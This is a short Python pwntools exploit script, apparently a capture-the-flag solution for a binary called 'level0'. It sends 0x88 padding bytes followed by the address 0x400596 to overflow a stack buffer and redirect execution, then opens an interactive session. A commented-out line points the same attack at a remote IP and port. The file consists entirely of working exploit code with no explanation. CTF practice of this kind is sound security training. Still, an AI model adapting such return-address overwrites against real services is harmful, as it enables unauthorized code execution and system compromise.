from pwn import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./level0"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("220.249.52.133", 43631)

elf = ELF(binary)
# libc = ELF(libc_binary)
context.arch = "amd64"
payload = flat([
    "a"*0x88,0x400596
])
p.send(payload)

p.interactive()
